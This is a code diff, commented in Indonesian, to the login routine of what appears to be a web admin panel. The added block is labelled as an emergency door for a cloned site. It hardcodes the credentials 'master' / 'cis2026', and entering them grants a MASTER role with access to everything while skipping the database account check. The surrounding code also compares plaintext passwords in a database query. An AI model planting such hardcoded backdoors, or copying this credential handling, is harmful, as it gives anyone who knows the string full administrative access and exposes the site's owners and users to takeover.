@@ -633,6 +633,16 @@
         if(!u || !p) return alert("ID dan Key wajib diisi!");
         btn.innerText = "VERIFYING ENCRYPTION..."; btn.disabled = true;
 
+        // ==========================================
+        // PINTU DARURAT LOGIN (KHUSUS WEB KLONING)
+        // ==========================================
+        if(u === "master" && p === "cis2026") {
+            localStorage.setItem("cisAdminLog_v2", JSON.stringify({role: "MASTER", aksesArr: ["all"], nama: "Master Dewa"}));
+            window.prosesSuksesLogin("MASTER", ["all"], "Master Dewa");
+            return;
+        }
+        // ==========================================
+
         try {
             const q = query(collection(db, "Akun_Admin"), where("username", "==", u), where("password", "==", p)); 
             const snap = await getDocs(q);
